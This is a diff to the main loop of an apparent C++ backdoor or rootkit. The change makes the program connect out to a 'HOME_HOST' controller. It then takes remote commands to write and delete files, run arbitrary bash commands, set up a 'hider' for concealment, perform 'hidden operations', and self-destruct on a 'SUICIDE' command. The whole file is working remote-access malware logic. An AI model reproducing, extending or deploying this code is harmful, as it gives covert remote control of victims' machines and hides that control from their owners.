@@ -1,50 +1,41 @@
 #include <iostream>
 #include <array>
+#include <memory>
 
 #include "SoftwareManeger.h"
-#include "Status.h"
+#include "../IncludeCPP/Status.h"
 #include "FunCodes.h"
 #include "HiderManeger.h"
-#include "HiderCodes.h"
+#include "../Hider/HiderCodes.h"
 #include "Listener.h"
 #include "Connection.h"
+#include "../IncludeCPP/globalDefines.h"
 
 #define PORT (65432)
 
-void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger hiderManeger);
+void loopIter(std::shared_ptr<Connection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger);
 void testSoftwareManeger(void);
 
 int main() {
     
     SoftwareManeger swm = SoftwareManeger();
-    HiderManeger hiderManager = HiderManeger();
-    Listener listener = Listener(PORT);
+    HiderManeger& hiderManager = HiderManeger::getInstance();
+    std::shared_ptr<Connection> conn;
+    if (Connection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
+        exit(EXIT_FAILURE);
+    }
+
 
     bool cont = true;
     while (cont)
     {
-        Connection conn;
-        // TODO add error strtegy
-        if (listener.acceptConnection(conn) == -1) {
-            std::cerr << "listener.acceptConnection(conn) failed" << std::endl;
-            sleep(10);
-            continue;
-        }
         loopIter(conn, swm, hiderManager);
         std::cout << "compleated loop iter\n";
     }
 
     return EXIT_SUCCESS;
 }
-// & outdated
-// void testSoftwareManeger() {
-//     SoftwareManeger swm = SoftwareManeger();
-//     swm.fileWrite("tempSwmTest.txt", false, "this is my first test\n");
-//     swm.chunkWrite("tempSwmTest.txt", 1, "this is my second test\n");
-    
-//     swm.deleteFile("tempSwmTest.txt");
 
-// }
 
 
 
@@ -63,21 +54,23 @@ std::string execBash(const char* cmd) {
 }
 
 
-void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger hiderManeger)
+void loopIter(std::shared_ptr<Connection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger)
 {
     // receive command
-    Status res = SUCCSESS;
+    Status res = DID_NOTHING;
     command cmd;
 
-    conn.recvCommand(cmd);
+    conn->recvCommand(cmd);
     std::string strParam = cmd.strParam;
 
-    std::cout << "Server: fncode-" << cmd.fncode << " strParam-" << strParam << std::endl;
+    std::cout << "Server: fncode- " << cmd.fncode << "\nstrParam-" << strParam << std::endl;
     std::string strRes = "";
     switch (cmd.fncode)
     {
     case WRITE_FILE:
+        // std::cout << "start write_file\n";
         res = swm.fileWrite(conn, cmd.dataLen, strParam);
+        // std::cout << "finnish write_file\n";
         break;
 
     case DELETE_FILE:
@@ -86,18 +79,24 @@ void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger hiderManeger)
 
     case RUN_BASH:
         strRes = execBash(strParam.c_str()); // maybe we shoud abandon this option, it might be SUS
+        res = SUCCSESS;
         break;
 
     case HIDER_SETUP:
-        hiderManeger.setUpHider(strParam);
+        res = hiderManeger.setUpHider(strParam);
         break;
+    
+    case SUICIDE:
+        conn->sendResponceStruct((responce){.dataLen = 0, .status = SUICIDE_SUCSESS});
+        std::exit(EXIT_SUCCESS);
+    
     }
     // hidden handling
     if (cmd.fncode & HIDDEN_OPRATION) {
-        res = hiderManeger.hiddenAction(cmd.fncode, strParam, conn);
+        res = hiderManeger.hiddenAction(cmd, conn);
     }
     
     // TODO change such that there will be response only if we want it to be 
     std::cout << "Conn: res-" << res << " response-\n" << strRes << std::endl;
-    conn.sendResponce(res, strRes);
+    conn->sendResponce(res, strRes);
 }
